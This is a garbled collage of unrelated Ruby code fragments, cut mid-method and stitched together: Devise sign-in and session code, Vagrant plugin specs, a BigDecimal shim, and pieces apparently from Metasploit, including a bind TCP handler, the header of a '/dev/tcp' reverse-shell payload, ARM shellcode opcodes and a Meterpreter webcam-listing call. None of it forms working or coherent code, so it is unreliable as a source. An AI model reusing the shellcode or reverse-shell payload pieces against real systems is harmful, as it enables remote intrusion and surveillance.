
        
            # The path used after resending confirmation instructions.
    def after_resending_confirmation_instructions_path_for(resource_name)
      is_navigational_format? ? new_session_path(resource_name) : '/'
    end
    
      def serialize_options(resource)
    methods = resource_class.authentication_keys.dup
    methods = methods.keys if methods.is_a?(Hash)
    methods << :password if resource.respond_to?(:password)
    { methods: methods, only: [:password] }
  end
    
        if resource.errors.empty?
      set_flash_message! :notice, :unlocked
      respond_with_navigational(resource){ redirect_to after_unlock_path_for(resource) }
    else
      respond_with_navigational(resource.errors, status: :unprocessable_entity){ render :new }
    end
  end
    
        def email_changed(record, opts={})
      devise_mail(record, :email_changed, opts)
    end
    
    class TestController < ApplicationController
  include Rails.application.routes.url_helpers
    
                bypass_sign_in(user)
          DEPRECATION
          warden.session_serializer.store(resource, scope)
        elsif warden.user(scope) == resource && !options.delete(:force)
          # Do nothing. User already signed in and we are not forcing it.
          true
        else
          warden.set_user(resource, options.merge!(scope: scope))
        end
      end
    
            routes.each do |module_name, actions|
          [:path, :url].each do |path_or_url|
            actions.each do |action|
              action = action ? '#{action}_' : ''
              method = :'#{action}#{module_name}_#{path_or_url}'
    
          def initialize_from_record(record)
        @scope_name = Devise::Mapping.find_scope!(record)
        @resource   = instance_variable_set('@#{devise_mapping.name}', record)
      end
    
          module ClassMethods
        # Create the cookie key using the record id and remember_token
        def serialize_into_cookie(record)
          [record.to_key, record.rememberable_value, Time.now.utc.to_f.to_s]
        end
    
              # Parse the options and return if we don't have any target.
          argv = parse_options(opts)
          return if !argv
    
    describe VagrantPlugins::SyncedFolderRSync::DefaultUnixCap do
  include_context 'unit'
    
        it 'should not error destroying a non-existent box' do
      # Get the subject so that it is instantiated
      box = subject
    
      subject { described_class }
    
          provider_cls
    end
    
          it 'should not expand the relative host directory' do
        expect(docker_yml).to receive(:write).with(%r{my_volume_key})
      end
    end
    
        # Start a new handling thread
    self.listener_threads << framework.threads.spawn('BindTcpHandlerListener-#{lport}', false) {
      client = nil
    }
    
      def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Reverse TCP (/dev/tcp)',
      'Description'   => %q{
        Creates an interactive shell via bash's builtin /dev/tcp.
    }
    
                  # accept
              0xe1a00006, # mov     r0, r6
              0xe0411001, # sub     r1, r1, r1
              0xe0422002, # sub     r2, r2, r2
              0xe3a07001, # mov     r7, #1
              0xe1a07407, # lsl     r7, r7, #8
              0xe287701d, # add     r7, r7, #29
              0xef000000, # svc     0x00000000
    
      def webcam_list
    response = client.send_request(Packet.create_request('webcam_list'))
    names = []
    response.get_tlvs(TLV_TYPE_WEBCAM_NAME).each do |tlv|
      names << tlv.value
    end
    names
  end
    
      end
    
        # Havent figured this one out yet, but we need a PID owned by a user, can't steal tokens either
    if client.sys.config.is_system?
      print_error 'Cannot run as system'
      return 0
    end
    
    def BigDecimal.new(*args, **kwargs)
  return BigDecimal(*args) if kwargs.empty?
  BigDecimal(*args, **kwargs)
end
# Remove bigdecimal warning - end